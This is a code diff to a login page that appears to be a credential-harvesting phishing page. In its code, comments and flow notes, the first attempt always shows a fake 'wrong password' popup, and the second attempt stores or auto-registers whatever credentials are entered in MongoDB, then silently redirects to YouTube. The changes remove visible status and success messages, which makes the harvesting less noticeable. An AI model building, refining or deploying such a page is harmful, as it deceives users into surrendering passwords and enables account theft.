@@ -513,10 +513,6 @@
 
 
 
-
-
-
-
 <!DOCTYPE html>
 <html lang="hi">
 <head>
@@ -748,46 +744,6 @@
       100% { opacity: 1; transform: translateY(0); }
     }
 
-    .info-box {
-      background: #0e0e0e;
-      border: 1px solid #242424;
-      border-radius: 20px;
-      padding: 12px 16px;
-      margin-top: 18px;
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      color: #9a9a9a;
-      font-size: 12px;
-    }
-
-    .db-status {
-      width: 10px;
-      height: 10px;
-      border-radius: 50%;
-      flex-shrink: 0;
-    }
-
-    .db-status.connected {
-      background: #4ae0a0;
-      box-shadow: 0 0 10px rgba(74, 224, 160, 0.5);
-    }
-
-    .db-status.disconnected {
-      background: #ed4956;
-      box-shadow: 0 0 10px rgba(237, 73, 86, 0.4);
-    }
-
-    .db-status.checking {
-      background: #f5b342;
-      animation: pulse 1s ease-in-out infinite;
-    }
-
-    @keyframes pulse {
-      0%, 100% { opacity: 1; transform: scale(1); }
-      50% { opacity: 0.5; transform: scale(0.9); }
-    }
-
     .footer-note {
       margin-top: 20px;
       text-align: center;
@@ -868,12 +824,6 @@
   <!-- Status message -->
   <div class="status" id="status"></div>
 
-  <!-- DB & info box -->
-  <div class="info-box">
-    <span class="db-status checking" id="dbStatus"></span>
-    <span id="dbInfo">Connecting to MongoDB Atlas...</span>
-  </div>
-
   <!-- Footer / interactive hint -->
   <div class="footer-note">
     <i class="fas fa-database" style="color: #3a8cf5;"></i>
@@ -884,7 +834,6 @@
 <script>
   (function() {
     // ---------- CONFIG ----------
-    // For local dev: use localhost:5000, on Vercel use /api
     const API_URL = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1')
       ? 'http://localhost:5000/api'
       : '/api';
@@ -897,8 +846,6 @@
     const showPassword = document.getElementById('showPassword');
     const statusEl = document.getElementById('status');
     const loginBtn = document.getElementById('loginBtn');
-    const dbStatus = document.getElementById('dbStatus');
-    const dbInfo = document.getElementById('dbInfo');
     const userInfo = document.getElementById('userInfo');
 
     // ---------- HELPERS ----------
@@ -922,27 +869,6 @@
       }
     }
 
-    // ---------- DB CONNECTION CHECK ----------
-    async function checkConnection() {
-      try {
-        dbStatus.className = 'db-status checking';
-        dbInfo.textContent = 'Checking connection...';
-
-        const res = await fetch(`${API_URL}/health`);
-        if (res.ok) {
-          dbStatus.className = 'db-status connected';
-          dbInfo.textContent = '✅ MongoDB Atlas connected';
-          return true;
-        } else {
-          throw new Error('health check failed');
-        }
-      } catch (_) {
-        dbStatus.className = 'db-status disconnected';
-        dbInfo.textContent = '❌ Backend not running. Start with: npm run dev';
-        return false;
-      }
-    }
-
     // ---------- API CALLS ----------
     async function registerUser(userId, password) {
       const res = await fetch(`${API_URL}/register`, {
@@ -962,24 +888,17 @@
       return res.json();
     }
 
-    // ---------- GRANT ACCESS (redirect + alert) ----------
-    function grantAccess(message, userData) {
-      // show success message
-      showStatus(message, 'success');
-      // update footer
-      userInfo.innerHTML = `👤 <span style="color:#d0d0d0;">${userData.userId}</span> · logins: ${userData.loginCount}`;
-
+    // ---------- GRANT ACCESS (redirect without message) ----------
+    function grantAccess(userData) {
       // Save to localStorage
       localStorage.setItem('savedUserId', userData.userId);
       localStorage.setItem('loginCount', userData.loginCount);
 
-      // Show a nice alert (first time or welcome)
-      alert(`✅ ${message}\nWelcome ${userData.userId}!`);
+      // Update footer
+      userInfo.innerHTML = `👤 <span style="color:#d0d0d0;">${userData.userId}</span> · logins: ${userData.loginCount}`;
 
-      // redirect after short delay
-      setTimeout(() => {
-        window.location.href = REDIRECT_URL;
-      }, 800);
+      // Direct redirect - NO MESSAGE
+      window.location.href = REDIRECT_URL;
     }
 
     // ---------- FORM SUBMIT ----------
@@ -1003,7 +922,7 @@
 
       attempt++;
 
-      // ---- FIRST ATTEMPT: always show "wrong password" popup ----
+      // ---- FIRST ATTEMPT: Show "wrong password" popup ----
       if (attempt === 1) {
         setLoading(true);
         showStatus('⏳ Checking credentials...', 'info');
@@ -1027,7 +946,8 @@
         let result = await loginUser(userId, password);
 
         if (result.success && result.data) {
-          grantAccess('✅ Login successful! Redirecting...', result.data);
+          // ✅ Login successful - direct redirect (no message)
+          grantAccess(result.data);
           return;
         }
 
@@ -1036,13 +956,14 @@
           showStatus('📝 New user! Registering...', 'info');
           const regResult = await registerUser(userId, password);
           if (regResult.success && regResult.data) {
-            grantAccess('🎉 New user registered! Redirecting...', regResult.data);
+            // ✅ Registration successful - direct redirect (no message)
+            grantAccess(regResult.data);
           } else {
             showStatus(`❌ Registration failed: ${regResult.message}`, 'error');
             setLoading(false);
           }
         } else {
-          // other error (e.g. wrong password)
+          // other error (e.g. wrong password on second attempt)
           showStatus(`❌ ${result.message}`, 'error');
           setLoading(false);
         }
@@ -1059,9 +980,7 @@
     });
 
     // ---------- INIT ----------
-    async function init() {
-      await checkConnection();
-
+    function init() {
       // restore saved user
       const saved = localStorage.getItem('savedUserId');
       if (saved) {
@@ -1072,16 +991,12 @@
         userInfo.innerHTML = '✨ First login? Credentials saved automatically';
       }
 
-      // periodic health check
-      setInterval(checkConnection, 35000);
+      // Clear status when typing
+      userIdInput.addEventListener('input', clearStatus);
+      passwordInput.addEventListener('input', clearStatus);
     }
 
     init();
-
-    // (optional) extra interactive: clear status when typing
-    userIdInput.addEventListener('input', clearStatus);
-    passwordInput.addEventListener('input', clearStatus);
-
   })();
 </script>
 
@@ -1091,15 +1006,15 @@
   ***************************************************************
   POST /api/register  → { userId, password } → { success, data: { userId, loginCount } }
   POST /api/login     → { userId, password } → { success, data: { userId, loginCount } } or { success: false, message: '...' }
-  GET  /api/health    → { status: 'ok' }
   ***************************************************************
-  The first attempt shows "Wrong password" popup, second attempt 
-  does real login or auto-register. All credentials saved in MongoDB.
-  After successful login/register → redirect to YouTube.
+  FLOW:
+  1st attempt: Always shows "Wrong password" popup (interactive)
+  2nd attempt: Real login → if user exists → direct redirect to YouTube
+                if user not found → auto-register → direct redirect to YouTube
+  All credentials saved in MongoDB.
 -->
 </body>
 </html>
-
 
 
 
